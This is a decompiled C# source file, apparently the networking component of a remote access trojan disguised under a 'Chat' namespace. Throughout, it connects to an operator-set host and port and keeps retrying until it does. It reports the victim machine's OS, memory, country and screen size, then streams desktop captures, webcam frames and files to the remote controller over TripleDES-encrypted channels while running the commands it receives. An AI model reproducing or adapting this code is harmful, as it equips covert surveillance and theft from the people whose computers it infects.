namespace Chat
{
    using Chat.My;
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.Net.Sockets;
    using System.Runtime.CompilerServices;
    using System.Runtime.Serialization.Formatters.Binary;
    using System.Threading;
    using System.Windows.Forms;

    [StandardModule]
    internal sealed class Socketss
    {
        private static BinaryFormatter bf = new BinaryFormatter();
        private static Thread chatThread;
        public static TcpClient client;
        private static IAsyncResult ConnectAsync;
        private static string culture = CultureInfo.CurrentCulture.EnglishName;
        public static string EncriptionKey;
        public static string host;
        private static bool IsPreviewEnabled = false;
        public static List<Data> ListDataFileM = new List<Data>();
        public static List<Data> ListDataSend = new List<Data>();
        public static List<Data> ListDataSendDesktop = new List<Data>();
        public static List<Data> listDataSendWebcam = new List<Data>();
        private static string paese = culture.Substring(culture.IndexOf('(') + 1, (culture.LastIndexOf(')') - culture.IndexOf('(')) - 1);
        public static int port;
        public static bool sendingData = false;
        public static Thread SendThrea = new Thread(new ThreadStart(Socketss.Send));
        public static string ServerName;
        public static string ServerVersion = "V1.3.1";
        private static Thread t;

        [DebuggerStepThrough, CompilerGenerated]
        private static void _Lambda$__6(object a0)
        {
            Parse((Data) a0);
        }

        [DebuggerStepThrough, CompilerGenerated]
        private static void _Lambda$__7(object a0)
        {
            SplitFunzioni.FunctionWorked((object[]) a0);
        }

        public static void Connect(string cpu)
        {
            ListDataSend.Clear();
            ListDataFileM.Clear();
            ListDataSendDesktop.Clear();
            listDataSendWebcam.Clear();
            SplitFunzioni.EndDesk = false;
            if (client != null)
            {
                client.Close();
                client = null;
            }
        Label_0057:;
            try
            {
                client = new TcpClient(host, port);
                double num = (((double) MyProject.Computer.Info.TotalPhysicalMemory) / 1048576.0) / 1024.0;
                Data graph = new Data("Ping|S|0", null, null);
                Application.DoEvents();
                bf.Serialize(client.GetStream(), graph);
                while (true)
                {
                    while (client.Client.Available > 0)
                    {
                        Data data2 = (Data) bf.Deserialize(client.GetStream());
                        if (data2.GetData() != null)
                        {
                            EncriptionKey = data2.GetData();
                            break;
                        }
                    }
                    Thread.Sleep(20);
                }
                Thread.Sleep(50);
                SendThrea.IsBackground = false;
                ListDataSend.Add(new Data("Connected|S|{I\x00e8}|S|" + cpu + "|S|" + MyProject.Computer.Info.OSFullName.Replace("Microsoft Windows", "Win") + "|S|" + ServerName + "|S|" + num.ToString("N") + "Gb|S|" + paese + "|S|" + Conversions.ToString(MyProject.Computer.Screen.Bounds.Width) + "X" + Conversions.ToString(MyProject.Computer.Screen.Bounds.Height), null, null));
                SendThrea.Start();
                client.GetStream().BeginRead(new byte[] { 0 }, 0, 0, new AsyncCallback(Socketss.Read), null);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Thread.Sleep(100);
                ProjectData.ClearProjectError();
                goto Label_0057;
                ProjectData.ClearProjectError();
            }
        }

        public static void Parse(Data info)
        {
            string data = info.GetData();
            Thread thread = new Thread(new ParameterizedThreadStart(Socketss._Lambda$__7));
            thread.IsBackground = false;
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start(new object[] { data, info });
        }

        public static void Read(IAsyncResult ar)
        {
            try
            {
                if (client.GetStream().DataAvailable & client.GetStream().CanRead)
                {
                    try
                    {
                        Thread thread = new Thread(new ParameterizedThreadStart(Socketss._Lambda$__6));
                        thread.IsBackground = true;
                        thread.Start((Data) bf.Deserialize(client.GetStream()));
                    }
                    catch (Exception exception1)
                    {
                        ProjectData.SetProjectError(exception1);
                        ProjectData.ClearProjectError();
                    }
                }
                client.GetStream().Flush();
                client.GetStream().BeginRead(new byte[] { 0 }, 0, 0, new AsyncCallback(Socketss.Read), null);
            }
            catch (Exception exception2)
            {
                ProjectData.SetProjectError(exception2);
                Thread.Sleep(200);
                if (!SplitFunzioni.RestartThread.IsAlive)
                {
                    SplitFunzioni.RestartThread.Start();
                }
                ProjectData.ClearProjectError();
            }
        }

        public static void Send()
        {
            while (true)
            {
                if (ListDataSendDesktop.Count > 0)
                {
                    try
                    {
                        Data data = ListDataSendDesktop[0];
                        Data graph = new Data(Compressione.TripleDES(data.GetData(), EncriptionKey, false), data.GetImage(), data.GetBytes());
                        Application.DoEvents();
                        bf.Serialize(client.GetStream(), graph);
                        ListDataSendDesktop.RemoveAt(0);
                        Thread.Sleep(5);
                    }
                    catch (Exception exception1)
                    {
                        ProjectData.SetProjectError(exception1);
                        ProjectData.ClearProjectError();
                    }
                }
                Thread.Sleep(2);
                if (ListDataSend.Count > 0)
                {
                    try
                    {
                        Data data3 = ListDataSend[0];
                        Data data4 = new Data(Compressione.TripleDES(data3.GetData(), EncriptionKey, false), data3.GetImage(), data3.GetBytes());
                        Application.DoEvents();
                        bf.Serialize(client.GetStream(), data4);
                        ListDataSend.RemoveAt(0);
                        Thread.Sleep(5);
                    }
                    catch (Exception exception2)
                    {
                        ProjectData.SetProjectError(exception2);
                        ProjectData.ClearProjectError();
                    }
                }
                if (listDataSendWebcam.Count > 0)
                {
                    try
                    {
                        Data data5 = listDataSendWebcam[0];
                        Data data6 = new Data(Compressione.TripleDES(data5.GetData(), EncriptionKey, false), data5.GetImage(), data5.GetBytes());
                        Application.DoEvents();
                        bf.Serialize(client.GetStream(), data6);
                        listDataSendWebcam.RemoveAt(0);
                    }
                    catch (Exception exception3)
                    {
                        ProjectData.SetProjectError(exception3);
                        ProjectData.ClearProjectError();
                    }
                    Thread.Sleep(5);
                }
                Thread.Sleep(2);
                if (ListDataFileM.Count > 0)
                {
                    if (sendingData)
                    {
                        sendingData = false;
                        Data data7 = ListDataFileM[0];
                        Data data8 = new Data(Compressione.TripleDES(data7.GetData(), EncriptionKey, false), data7.GetImage(), data7.GetBytes());
                        Application.DoEvents();
                        bf.Serialize(client.GetStream(), data8);
                        ListDataFileM.RemoveAt(0);
                        Thread.Sleep(5);
                    }
                }
                else
                {
                    Thread.Sleep(5);
                }
                Thread.Sleep(2);
            }
        }
    }
}

